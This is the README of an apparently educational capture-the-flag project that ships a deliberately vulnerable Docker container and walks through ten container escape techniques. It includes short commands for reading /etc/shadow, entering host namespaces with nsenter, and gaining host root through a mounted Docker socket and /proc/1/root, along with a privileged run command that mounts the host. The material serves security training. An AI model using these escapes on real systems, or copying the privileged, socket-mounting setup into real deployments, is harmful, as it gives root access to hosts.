# Container Escape Trainer (MVP) 🔓

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![CTF](https://img.shields.io/badge/escapes-10%2F10-brightgreen)
![Docker](https://img.shields.io/badge/docker-required-blue.svg)

> **"CTF-in-a-Box – break out, redact the flag, prove you fixed it"**

An offline, hands-on container security training platform that teaches 10 real-world container escape techniques through practical CTF challenges. Perfect for security professionals, DevOps engineers, and anyone interested in container security.

---

## 🎯 What is This?

Container Escape Trainer is a deliberately vulnerable Docker container designed for educational purposes. It provides a safe, isolated environment where you can:

- **Learn** 10 different container escape techniques
- **Practice** privilege escalation in containerized environments
- **Understand** common container security misconfigurations
- **Master** security assessment and remediation skills

The challenge combines container security with privacy engineering: after escaping the container and finding the sensitive data (fake credit card), you must use a privacy OCR tool to redact it—demonstrating both offensive and defensive security skills.

---

## 📋 Table of Contents

- [Features](#-features)
- [Prerequisites](#-prerequisites)
- [Installation & Setup](#-installation--setup)
- [Quick Start](#-quick-start)
- [The Challenge](#-the-challenge)
- [The 10 Escape Paths](#-the-10-escape-paths)
- [How It Works](#-how-it-works)
- [Win Condition](#-win-condition)
- [Architecture](#-architecture)
- [Troubleshooting](#-troubleshooting)
- [Security Warnings](#-security-warnings)
- [Educational Use](#-educational-use)
- [Contributing](#-contributing)
- [License](#-license)

---

## ✨ Features

- **10 Progressive Container Escapes**: From capability abuse to Docker socket exploitation
- **Offline Operation**: No internet required—perfect for air-gapped training environments
- **Auto-Validation**: Automated checker verifies successful redaction and provides immediate feedback
- **Comprehensive Hints**: Built-in hint system guides learners through each escape path
- **Timer System**: Track your completion time and compete with colleagues
- **Privacy Integration**: Combines container security with data privacy/redaction skills
- **Portable**: Single Docker image (~120MB) runs anywhere Docker is available
- **Safe Learning**: Isolated environment prevents accidental damage to host systems (when used correctly)

---

## 📦 Prerequisites

### Required Software

1. **Docker** (version 20.10 or higher)
   - Docker Engine (Linux) or Docker Desktop (Windows/Mac)
   - Must be able to run containers with `--privileged` flag
   - Docker socket at `/var/run/docker.sock` must be accessible

2. **Operating System**
   - Linux (recommended)
   - macOS with Docker Desktop
   - Windows with WSL2 and Docker Desktop

3. **Disk Space**
   - ~500MB for Docker image and build artifacts

4. **Privacy OCR Tool** (for win condition)
   - You need a separate `redact.exe` tool that can redact credit card numbers
   - The tool should accept a filename and produce `filename_report.json`
   - This tool is NOT included—use your own or build one

### System Requirements

- **CPU**: 2+ cores recommended
- **RAM**: 4GB minimum, 8GB recommended
- **Permissions**: Ability to run Docker with privileged mode

### Knowledge Prerequisites

- Basic Linux command line skills
- Understanding of Docker concepts (containers, images, volumes)
- Basic understanding of Linux permissions and privilege escalation
- Familiarity with CTF (Capture The Flag) challenges is helpful but not required

---

## 🚀 Installation & Setup

### Step 1: Clone the Repository

```bash
git clone https://github.com/Alartist40/Container-Escape-Trainer.git
cd Container-Escape-Trainer
```

### Step 2: Build the Docker Image

#### On Linux/Mac:

```bash
chmod +x build.sh
./build.sh
```

#### On Windows (using Git Bash or WSL):

```bash
chmod +x build.sh
./build.sh
```

#### Using Docker directly:

```bash
docker build -t escape:latest .
```

The build process will:
1. Pull the Debian base image
2. Install required packages
3. Configure the 10 escape mechanisms
4. Create hint files
5. Set up the validation system

**Build time**: ~2-5 minutes (depending on internet speed for first build)

### Step 3: Verify the Build

Check that the image was created successfully:

```bash
docker images | grep escape
```

You should see:
```
escape    latest    <image-id>    <time-ago>    ~120MB
```

---

## 🎮 Quick Start

### Running the CTF Challenge

#### Option 1: Using the run script (easiest)

```bash
chmod +x run.sh
./run.sh
```

#### Option 2: Manual Docker command

```bash
docker run -it --rm \
  --privileged \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /:/host \
  --name ctf \
  escape:latest
```

**Important flags explained**:
- `--privileged`: Grants extended privileges (required for escapes to work)
- `-v /var/run/docker.sock:/var/run/docker.sock`: Mounts Docker socket for Docker-based escapes
- `-v /:/host`: Mounts host filesystem at `/host` inside container
- `--name ctf`: Names the container for easy reference

### What Happens Next

1. Container starts and displays a welcome banner
2. You see the 10 escape paths and hints
3. A background daemon starts monitoring for the redaction report
4. You get an interactive bash shell as the `escape` user
5. Your timer starts!

Now the challenge begins... ⏰

---

## 🎓 The Challenge

### Objective

1. **Escape the container** using any of the 10 provided techniques
2. **Navigate to the host filesystem** and locate `/host/flag10.txt`
3. **Read the credit card number** inside the flag file
4. **Obtain and run** the `redact.exe` privacy tool to mask the credit card
5. **Wait for validation**—the auto-checker will verify your success

### Example Workflow

```bash
# You start in the container as 'escape' user
escape@container:~$ whoami
escape

# Explore your environment
escape@container:~$ capsh --print
escape@container:~$ ls /hints/
escape@container:~$ cat /hints/02_reconnaissance.txt

# Attempt an escape (example using capabilities)
escape@container:~$ cat /etc/shadow  # Normally forbidden, but you have CAP_DAC_READ_SEARCH!

# Find the host mount
escape@container:~$ ls /host
# (You see the host filesystem!)

# Locate the flag
escape@container:~$ cat /host/flag10.txt
# (You see the credit card number: 4444-4444-4444-4444)

# Get your redaction tool (example: download from USB or http server)
escape@container:~$ curl -O http://your-server/redact.exe
escape@container:~$ chmod +x redact.exe

# Redact the credit card
escape@container:~$ ./redact.exe /host/flag10.txt
[+] Created flag10_redacted.txt
[+] Created flag10_report.json

# Wait a few seconds...
# The auto-checker validates your work and prints:
╔══════════════════════════════════════════════════════════════════╗
║  🎯  FLAG REDACTED - CTF PASS 10/10  🎯                         ║
╚══════════════════════════════════════════════════════════════════╝
✅ Credit card successfully masked!
⏱️  Time: 4m12s
🏆 Challenge completed!
```

---

## 🔐 The 10 Escape Paths

Each escape represents a real-world container misconfiguration or vulnerability. You only need to successfully use ONE to complete the challenge, but learning all 10 will make you a container security expert!

### 1. **CAP_DAC_READ_SEARCH** - Capability Abuse
**Difficulty**: ⭐ Easy  
**Description**: The container grants `CAP_DAC_READ_SEARCH` capability to `/bin/cat` and `/bin/bash`, allowing you to bypass file read permission checks.

**How to exploit**:
```bash
# Read normally forbidden files
cat /etc/shadow
cat /host/flag10.txt
```

**Real-world impact**: Over-permissive capabilities can expose sensitive host data.

---

### 2. **CAP_SYS_ADMIN** - Mount Operations
**Difficulty**: ⭐⭐ Medium  
**Description**: `CAP_SYS_ADMIN` capability is granted to `nsenter`, enabling mount/unmount operations and namespace manipulation.

**How to exploit**:
```bash
# Use nsenter to enter host namespaces
nsenter -t 1 -m -u -n -i sh
```

**Real-world impact**: CAP_SYS_ADMIN is extremely powerful and should rarely be granted to containers.

---

### 3. **Privileged Container** - Full Capabilities
**Difficulty**: ⭐ Easy  
**Description**: When run with `--privileged`, the container has ALL Linux capabilities and can directly interact with the host.

**How to exploit**:
```bash
# Check capabilities
capsh --print | grep Current

# Access host devices
ls -la /dev

# Mount host filesystem (if not already mounted)
mkdir /mnt/host
mount /dev/sda1 /mnt/host
```

**Real-world impact**: Privileged containers are essentially root on the host. Use sparingly and never in production for untrusted workloads.

---

### 4. **Host Path Mount** - Filesystem Access
**Difficulty**: ⭐ Very Easy  
**Description**: The host filesystem is mounted at `/host` inside the container, providing direct access to all host files.

**How to exploit**:
```bash
# Simply navigate to /host
cd /host
ls -la
cat /host/flag10.txt
```

**Real-world impact**: Overly broad host mounts can expose sensitive data. Only mount specific directories needed.

---

### 5. **Docker Socket Exposure** - Container Control
**Difficulty**: ⭐⭐⭐ Medium-Hard  
**Description**: The Docker socket (`/var/run/docker.sock`) is mounted inside the container, allowing you to control Docker from within.

**How to exploit**:
```bash
# Check for Docker socket
ls -la /var/run/docker.sock

# Run a new privileged container with host filesystem mounted
docker run -it --rm -v /:/host alpine chroot /host /bin/bash

# Now you're root on the host!
```

**Real-world impact**: Docker socket = root on host. Never mount it in untrusted containers.

---

### 6. **PID Namespace Sharing** - Process Visibility
**Difficulty**: ⭐⭐ Medium  
**Description**: Container shares the host PID namespace, allowing visibility and manipulation of host processes.

**How to exploit**:
```bash
# See host processes
ps aux

# Access host filesystem via /proc
ls -la /proc/1/root
cat /proc/1/root/flag10.txt
```

**Real-world impact**: PID namespace sharing can leak information and enable privilege escalation.

---

### 7. **Writable Cgroup** - Control Group Manipulation
**Difficulty**: ⭐⭐⭐⭐ Hard  
**Description**: Writable cgroup paths with `notify_on_release` can execute arbitrary code on the host.

**How to exploit**:
```bash
# This is a complex exploit - see /hints/07_cgroup.txt for details
# Requires setting up release_agent and triggering cgroup release
```

**Real-world impact**: One of the more sophisticated container escape techniques discovered in recent years.

---

### 8. **Procfs Escape** - /proc Filesystem Abuse
**Difficulty**: ⭐⭐⭐ Medium-Hard  
**Description**: The `/proc` filesystem exposes paths to the host, particularly `/proc/1/root`.

**How to exploit**:
```bash
# Access host root via proc
ls -la /proc/1/root

# If you have appropriate capabilities, you can access files
cat /proc/1/root/flag10.txt
```

**Real-world impact**: `/proc` can leak host information; combined with other issues, it enables escapes.

---

### 9. **Weak Seccomp Profile** - Syscall Filtering
**Difficulty**: ⭐⭐⭐ Medium  
**Description**: Weak or disabled seccomp filtering allows dangerous syscalls that can be used for exploitation.

**How to exploit**:
```bash
# Check seccomp status
grep Seccomp /proc/self/status

# If weak/disabled, try kernel exploits like Dirty COW
# (This container doesn't include active kernel exploits for safety)
```

**Real-world impact**: Seccomp provides syscall filtering; weak profiles reduce defense depth.

---

### 10. **No AppArmor / SELinux** - MAC Disabled
**Difficulty**: ⭐ Easy (reconnaissance)  
**Description**: Lack of mandatory access control (AppArmor/SELinux) reduces security boundaries.

**How to exploit**:
```bash
# Check AppArmor/SELinux status
cat /proc/self/attr/current

# If unconfined, you have more freedom to exploit other weaknesses
# Combine with other escape paths for success
```

**Real-world impact**: MAC systems add important security layers; their absence makes exploitation easier.

---

## 🔧 How It Works

### Architecture Overview

```
┌─────────────────────────────────────────────────────────────┐
│                        Host System                          │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐ │
│  │              Docker Container (escape)                │ │
│  │                                                       │ │
│  │  User: escape (non-root, but with capabilities)      │ │
│  │                                                       │ │
│  │  ┌─────────────┐  ┌──────────────┐  ┌─────────────┐ │ │
│  │  │  start.sh   │  │ checkredact  │  │   /hints/   │ │ │
│  │  │  (entry)    │  │  .sh daemon  │  │   (guides)  │ │ │
│  │  └─────────────┘  └──────────────┘  └─────────────┘ │ │
│  │                                                       │ │
│  │  Escape Mechanisms:                                  │ │
│  │  • Capabilities (CAP_DAC_READ_SEARCH, CAP_SYS_ADMIN) │ │
│  │  • Mounted Docker socket (/var/run/docker.sock)     │ │
│  │  • Mounted host filesystem (/host)                  │ │
│  │  • Privileged mode                                  │ │
│  │  • Weak security profiles                           │ │
│  │                                                       │ │
│  └───────────────────────────────────────────────────────┘ │
│                                                             │
│  /host/flag10.txt  ← Target file with credit card         │
│  /var/run/docker.sock  ← Docker control socket            │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### Component Descriptions

#### 1. **Dockerfile**
Builds the container with:
- Debian bullseye-slim base
- Required packages (Docker, sudo, capabilities tools)
- Non-root `escape` user
- All 10 escape mechanisms configured

#### 2. **start.sh** (Entry Point)
- Displays welcome banner and instructions
- Shows all 10 escape paths
- Records start time
- Launches `checkredact.sh` daemon
- Drops to interactive bash shell

#### 3. **exploits/setup.sh**
Runs during build to configure:
- Linux capabilities on binaries
- Hint files in `/hints/` directory
- Flag file at `/host/flag10.txt`
- All 10 escape mechanisms

#### 4. **checkredact.sh** (Validation Daemon)
Background process that:
- Monitors for `flag10_report.json` file
- Checks if credit card `4444-4444-4444-4444` is redacted
- Calculates elapsed time
- Prints success/failure message
- Exits when validation passes

#### 5. **Hints System**
11 hint files in `/hints/` directory:
- `00_index.txt` - Overview of all hints
- `01_capabilities.txt` - Linux capabilities guide
- `02_reconnaissance.txt` - Information gathering techniques
- `03_privileged.txt` through `10_apparmor.txt` - Specific escape guides

---

## 🏆 Win Condition

### Success Criteria

You successfully complete the CTF when:

1. ✅ You escape the container (using any of the 10 methods)
2. ✅ You locate and read `/host/flag10.txt`
3. ✅ You run `redact.exe /host/flag10.txt`
4. ✅ The `flag10_report.json` file shows the credit card is masked
5. ✅ The `checkredact.sh` daemon validates and prints success

### Expected Output

```
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║  🎯  FLAG REDACTED - CTF PASS 10/10  🎯                         ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝

  ✅ Credit card successfully masked!
  ⏱️  Time: 4m12s
  🏆 Challenge completed!

═══════════════════════════════════════════════════════════════════

🎓 Congratulations! You have successfully:
   1. ✓ Escaped the container using one or more of 10 techniques
   2. ✓ Located the sensitive flag file
   3. ✓ Used Privacy-OCR to redact the credit card
   4. ✓ Passed the automatic validation
```

### About the Redaction Tool

The CTF requires a separate `redact.exe` tool that:
- Accepts a filename as input
- Detects and masks credit card numbers
- Produces `filename_report.json` with the original text (where cards should be masked)

This tool is **NOT included** in this repository. You can:
- Build your own using OCR libraries (Tesseract, EasyOCR)
- Use your existing privacy/redaction tools
- Create a simple script that processes and masks the flag file

---

## 🛠 Troubleshooting

### Build Issues

**Problem**: Docker build fails with "permission denied"
```bash
# Solution: Ensure Docker daemon is running and you have permissions
sudo systemctl start docker
sudo usermod -aG docker $USER
# Then log out and back in
```

**Problem**: Build fails at "setcap" commands
```bash
# Solution: Ensure libcap2-bin is installed in the container
# The Dockerfile already includes this, but you may need to rebuild
docker build --no-cache -t escape:latest .
```

### Runtime Issues

**Problem**: Container immediately exits
```bash
# Solution: Ensure you're using -it (interactive + TTY)
docker run -it escape:latest
```

**Problem**: "Permission denied" accessing Docker socket
```bash
# Solution: Ensure socket is mounted and you have permissions
# Add your user to docker group (host system)
sudo usermod -aG docker $USER
```

**Problem**: Cannot access /host directory
```bash
# Solution: Ensure you're mounting host filesystem
docker run -it --privileged -v /:/host escape:latest
```

**Problem**: Win condition not triggering
```bash
# Check if checkredact.sh is running
ps aux | grep checkredact

# Check report file location
find / -name "flag10_report.json" 2>/dev/null

# Manually check the report
cat /host/flag10_report.json
# Ensure it doesn't contain "4444-4444-4444-4444"
```

### Container Escape Issues

**Problem**: Can't read files with CAP_DAC_READ_SEARCH
```bash
# Check if capabilities are set
getcap /bin/cat /bin/bash

# Re-run setup if needed (rebuild container)
```

**Problem**: Docker socket doesn't work
```bash
# Verify socket is mounted
ls -la /var/run/docker.sock

# Check Docker is accessible
docker ps
# If command not found, Docker client may not be installed (rebuild)
```

---

## ⚠️ Security Warnings

### CRITICAL: This Container is DELIBERATELY VULNERABLE

This container is designed for **EDUCATIONAL PURPOSES ONLY** and contains intentional security vulnerabilities. **NEVER** use this container:

- ❌ In production environments
- ❌ On systems with sensitive data
- ❌ Connected to production networks
- ❌ With untrusted users who shouldn't have host access
- ❌ On shared infrastructure or public cloud without isolation

### Safe Usage Guidelines

✅ **DO**:
- Use on dedicated training/lab systems
- Run in isolated VMs or dedicated hardware
- Use for organized security training sessions
- Study the code to understand vulnerabilities
- Practice in controlled, supervised environments

❌ **DON'T**:
- Deploy in any production setting
- Run on systems with confidential information
- Allow untrusted users to access the host system
- Use on shared resources without proper isolation
- Forget that this gives **ROOT ACCESS** to the host

### Understanding the Risks

When you run this container with `--privileged` and mount the Docker socket/host filesystem, participants can:

- Execute arbitrary code as root on the host
- Access all files on the host system
- Modify system configurations
- Deploy additional containers
- Potentially damage the host OS

**Always use on disposable/resettable systems!**

---

## 📚 Educational Use

### Perfect For

- **Security training workshops** - Hands-on container security education
- **University courses** - Cybersecurity and cloud security curricula
- **CTF competitions** - Container security challenges
- **DevOps training** - Understanding container security risks
- **Certification prep** - OSCP, CEH, security certifications
- **Team building** - Security team skill development

### Learning Outcomes

After completing this challenge, participants will understand:

1. **10 real container escape techniques** used in the wild
2. **Linux capability system** and its security implications
3. **Container isolation boundaries** and how they can be broken
4. **Docker security best practices** (by seeing what NOT to do)
5. **Privilege escalation** in containerized environments
6. **Defense-in-depth** security strategies
7. **Data privacy and redaction** techniques

### Recommended Workshop Format

1. **Introduction** (15 min): Explain container security concepts
2. **Demo** (10 min): Show one escape path as an example
3. **Hands-on** (60-90 min): Participants attempt escapes
4. **Discussion** (20 min): Review techniques and mitigation strategies
5. **Advanced** (30 min): Discuss how to secure production containers

---

## 🤝 Contributing

Contributions are welcome! Here's how you can help:

### Reporting Issues

Found a bug? Have a suggestion? Please open an issue with:
- Detailed description
- Steps to reproduce
- Expected vs actual behavior
- System information (OS, Docker version)

### Contributing Code

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/new-escape`)
3. Make your changes
4. Test thoroughly
5. Submit a pull request

### Ideas for Contributions

- Additional escape techniques
- Improved hint system
- Multi-language support
- Video tutorials
- Alternative validation methods
- Kubernetes-based version
- Web-based scoreboard

---

## 📄 License

This project is licensed under the MIT License - see LICENSE file for details.

### DISCLAIMER

This software is provided for EDUCATIONAL PURPOSES ONLY. The authors are not responsible for any misuse or damage caused by this program. Use at your own risk. Always obtain proper authorization before testing security on any systems you do not own.

---

## 🙏 Acknowledgments

- Inspired by real-world container escape research
- Built using standard Linux and Docker technologies
- Hints and techniques based on public security research
- Designed for the security community by security practitioners

---

## 📞 Support & Questions

- **Issues**: [GitHub Issues](https://github.com/Alartist40/Container-Escape-Trainer/issues)
- **Discussions**: [GitHub Discussions](https://github.com/Alartist40/Container-Escape-Trainer/discussions)

---

## 🚀 What's Next?

After completing this CTF, consider:

1. **Build defenses**: Create a hardened container that blocks all 10 escapes
2. **Research further**: Study advanced container escape techniques
3. **Contribute**: Add new escape paths to this project
4. **Share**: Use this in training sessions or workshops
5. **Learn Kubernetes**: Explore pod security policies and admission controllers

---

**Built with ❤️ for the container security community**

*Remember: With great power comes great responsibility. Use these skills ethically!*
